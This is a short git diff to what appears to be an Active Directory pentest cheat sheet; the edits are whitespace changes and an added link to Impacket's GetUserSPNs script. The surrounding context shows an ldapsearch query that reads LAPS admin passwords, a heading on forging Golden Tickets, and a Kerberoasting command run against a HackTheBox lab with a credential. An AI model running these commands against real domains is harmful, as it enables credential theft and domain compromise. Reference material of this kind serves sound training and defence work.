@@ -1342,9 +1342,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
       ```bash
       ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
       ```
-
-
-
+     
 ### Pass-the-Ticket Golden Tickets
 
 Forging a TGT require the `krbtgt` NTLM hash
@@ -1457,7 +1455,7 @@ Mitigations:
 Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
 
-* `GetUserSPNs` from Impacket Suite
+* [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
   ```powershell
   $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 
